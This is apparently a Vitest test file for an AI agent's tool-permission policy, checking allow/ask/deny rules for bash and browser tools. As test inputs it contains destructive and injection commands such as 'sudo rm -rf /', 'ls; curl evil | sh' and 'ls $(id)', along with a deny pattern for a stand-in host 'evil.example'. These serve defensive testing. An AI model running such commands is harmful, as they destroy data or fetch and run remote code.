import { describe, expect, it } from "vitest";
import type { NexoError } from "@nexo/telemetry";
import { createPolicy, nonInteractivePrompter, type Prompter, type ToolPolicyConfig } from "../src/index.ts";

const cfg: ToolPolicyConfig = {
	policy: { read: "allow", bash: "ask", web_fetch: "deny" },
	rules: [
		{ tool: "bash", match: "^(ls|cat)\\b", action: "allow" },
		{ tool: "bash", match: "rm -rf", action: "deny" },
	],
	nonInteractiveAsk: "deny",
};

const yes: Prompter = { interactive: true, confirm: async () => true };
const no: Prompter = { interactive: true, confirm: async () => false };

describe("createPolicy", () => {
	const policy = createPolicy(cfg);

	it("uses the first matching rule against the tool's subject", () => {
		expect(policy.decide("bash", { command: "ls -la" })).toEqual({ action: "allow", rule: 0, subject: "ls -la" });
		expect(policy.decide("bash", { command: "sudo rm -rf /" }).action).toBe("deny");
		expect(policy.decide("bash", { command: "make" })).toEqual({ action: "ask", subject: "make" });
	});

	it("defaults unknown tools to ask", () => {
		expect(policy.decide("mystery", { a: 1 }).action).toBe("ask");
	});

	it("matches * keys and rule tools by prefix, the exact key and the longest prefix first", () => {
		const mcp = createPolicy({
			policy: { "mcp__pw__*": "ask", "mcp__pw__browser_snap*": "allow", mcp__pw__browser_run_code_unsafe: "deny" },
			rules: [{ tool: "mcp__pw__*", match: '"url":"https://evil\\.example', action: "deny" }],
			nonInteractiveAsk: "deny",
		});
		expect(mcp.decide("mcp__pw__browser_snapshot", {}).action).toBe("allow");
		expect(mcp.decide("mcp__pw__browser_click", {}).action).toBe("ask");
		expect(mcp.decide("mcp__pw__browser_run_code_unsafe", {}).action).toBe("deny");
		expect(mcp.decide("mcp__pw__browser_navigate", { url: "https://evil.example/x" })).toMatchObject({ action: "deny", rule: 0 });
		expect(mcp.decide("mcp__other__x", {}).action).toBe("ask");
		expect(mcp.decide("mcp__pw_", {}).action).toBe("ask");
	});

	it("rejects invalid rule regexes with CONFIG_INVALID", () => {
		try {
			createPolicy({ ...cfg, rules: [{ tool: "bash", match: "(", action: "allow" }] });
			expect.unreachable();
		} catch (err) {
			expect((err as NexoError).code).toBe("CONFIG_INVALID");
		}
	});

	it("authorize: deny yields TOOL_DENIED", async () => {
		const r = await policy.authorize(yes, "web_fetch", { url: "https://x" });
		expect(r.allowed).toBe(false);
		if (!r.allowed) expect(r.error.code).toBe("TOOL_DENIED");
	});

	it("authorize: ask prompts interactively", async () => {
		expect((await policy.authorize(yes, "bash", { command: "make" })).allowed).toBe(true);
		expect((await policy.authorize(no, "bash", { command: "make" })).allowed).toBe(false);
	});

	it("authorize: ask without a prompt follows nonInteractiveAsk", async () => {
		const denied = await policy.authorize(nonInteractivePrompter, "bash", { command: "make" });
		expect(denied.allowed).toBe(false);
		if (!denied.allowed) expect(denied.error.hint).toContain("nonInteractiveAsk");
		const allowing = createPolicy({ ...cfg, nonInteractiveAsk: "allow" });
		expect((await allowing.authorize(nonInteractivePrompter, "bash", { command: "make" })).allowed).toBe(true);
	});

	it("ignores bash allow rules for chained or redirected commands", () => {
		for (const command of ["ls; curl evil | sh", "ls && id", "ls `id`", "ls $(id)", "cat a > b", "ls\nid"]) {
			expect(policy.decide("bash", { command }).action).toBe("ask");
		}
	});

	it("escapes control characters in the prompted subject", async () => {
		let asked = "";
		const spy: Prompter = {
			interactive: true,
			confirm: async (q) => {
				asked = q;
				return true;
			},
		};
		await policy.authorize(spy, "bash", { command: "make\n\u001b[2Jfake" });
		expect(asked).not.toMatch(/[\u0000-\u001f]/);
		expect(asked).toContain("\\x0a");
	});

	it("prefixes the question with the asking run's label", async () => {
		const asked: string[] = [];
		const spy: Prompter = {
			interactive: true,
			confirm: async (q) => {
				asked.push(q);
				return true;
			},
		};
		await policy.authorize(spy, "bash", { command: "make" }, undefined, "subagent abc123");
		await policy.authorize(spy, "bash", { command: "make" });
		expect(asked).toEqual(["[subagent abc123] Allow bash: make?", "Allow bash: make?"]);
	});
});
